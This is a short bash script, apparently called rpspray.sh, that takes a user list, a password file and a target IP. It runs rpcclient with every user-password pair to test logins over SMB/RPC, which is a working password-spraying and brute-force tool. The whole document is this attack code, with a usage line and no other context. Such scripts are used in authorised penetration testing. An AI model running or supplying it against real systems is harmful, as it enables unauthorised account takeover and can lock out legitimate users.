#!/bin/bash
userfile=$1
password=$2
targetip=$3
if [ "$1" == "" ] || [ "$2" == "" ] || [ "$3" == "" ]
    then
    echo "Usage : ./rpspray.sh userlist passwordtospray targetip"
else
    for u in `cat $userfile`
    do
    	for p in `cat $password`
    	do
	    	echo -ne "[*] Trying user@password: $u@$p \n" &&
	    	rpcclient -U "$u%$p" -c "getusername;quit" $targetip
    	done
    done
fi
